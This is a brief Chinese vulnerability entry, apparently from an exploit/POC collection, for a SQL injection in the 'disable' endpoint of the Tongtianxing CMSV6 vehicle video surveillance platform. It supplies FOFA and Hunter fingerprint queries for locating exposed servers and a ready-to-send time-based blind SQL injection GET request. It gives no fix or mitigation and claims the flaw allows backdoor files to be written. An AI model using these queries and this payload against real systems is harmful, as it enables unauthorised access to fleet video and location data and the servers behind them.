# 通天星CMSV6车载视频监控平台disable存在SQL注入

通天星CMSV6车载定位监控平台拥有以位置服务、无线3G/4G视频传输、云存储服务为核心的研发团队，专注于为定位、无线视频终端产品提供平台服务，通天星CMSV6产品覆盖车载录像机、单兵录像机、网络监控摄像机、行驶记录仪等产品的视频综合平台。其`disable`存在SQL注入，恶意攻击者利用此漏洞向服务器写入恶意的后门文件，从而获取服务器权限。

## fofa

```yaml
body="/808gps"
```

## Hunter

```yaml
web.body="/808gps"
```

## poc

```yaml
GET /edu_security_officer/disable;downloadLogger.action?ids=1+AND+%28SELECT+2688+FROM+%28SELECT%28SLEEP%285%29%29%29kOIi%29 HTTP/1.1
Host:
```

![image-20240721160542472](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407211605563.png)